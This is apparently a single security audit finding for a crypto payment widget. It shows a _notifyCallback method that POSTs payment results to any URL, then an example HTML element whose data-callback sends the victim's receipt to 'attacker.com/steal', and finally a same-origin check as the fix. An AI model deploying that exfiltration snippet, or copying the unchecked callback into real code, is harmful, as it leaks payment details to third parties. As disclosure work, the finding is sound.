Vulnerability #4: CSRF via callback URL

The _notifyCallback() method POSTs payment result to any URL without checking the origin of the request. An attacker can:

// VULNERABLE CODE (current widget):
async _notifyCallback(callbackUrl, result) {
  await fetch(callbackUrl, {   // ← no origin check!
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(result)
  });
}

Attack: Attacker controls data-callback on their site:

<div id="rtc-pay"
     data-callback="https://attacker.com/steal"
     data-to="C4c7r9WPsnEe6CUfegMU9M7ReHD1pWg8qeSfTBoRcLbg"
     data-amount="1">
</div>

Result: After a successful payment, the victim's payment receipt (tx hash, amount, from/to address) is POSTed to the attacker's server.

Fix: Verify callbackUrl.origin === window.location.origin before sending data.
